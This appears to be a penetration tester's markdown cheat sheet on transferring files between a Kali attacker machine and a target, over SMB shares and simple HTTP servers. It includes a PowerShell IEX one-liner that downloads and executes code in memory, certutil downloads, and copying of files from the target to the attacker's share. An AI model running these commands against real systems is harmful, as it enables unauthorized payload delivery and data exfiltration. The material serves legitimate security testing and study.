# File transfer

## SMB - from Windows to Kali or vice-versa

On Kali start a SMB share server on the folder you want to be shared
```
cd <path>
impacket-smbserver share $(pwd) -smb2support
```

On the target
```
net use \\<Kali IP>\share
net use
copy \\<Kali IP>\share\<file> .
dir
```

KALI to TARGET
```
xcopy \\<Kali IP>\share\<file> C:\<destination_path>\
```

TARGET to KALI
```
xcopy <source_path>\<file> \\<Kali IP>\share\
```


## HTTP - from attacker to target OR target to attacker

Python 2.7
```
cd <path>
python -m SimpleHTTPServer 8000
```

or

Python 3
```
cd <path>
python3 -m http.server 8000
```

or

PHP
```
cd <path>
php -S 0.0.0.0:8000
```

or

Ruby 
```
cd <path>
ruby -run -ehttpd . -p8000
```


### download to Windows

PowerShell
```
Invoke-WebRequest -Uri 'http://<http server IP>:8000/<filename>' -OutFile <filename> 
```

PowerShell from cmd
```
powershell.exe -command Invoke-WebRequest -Uri http://<http server IP>:8000/<filename> -OutFile <filename>
```

Download and execute with `Invoke-Expression` without saving file
```
powershell.exe IEX(New-Object Net.WebClient).downloadstring(http://<http server IP>:8000/<filename>)
```

Certutil
```
certutil -urlcache -split -f 'http://<http server IP>:8000/<filename>' <path_destiny><filename>
```


### download to Linux

wget
```
wget <http server IP>:8000/<filename>
```


## Links
- [file transfer cheatsheet Windows and Linux](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)
- https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/
- https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/
- https://fir3wa1-k3r.github.io/2018/10/17/File-Transfer-cheatsheet.html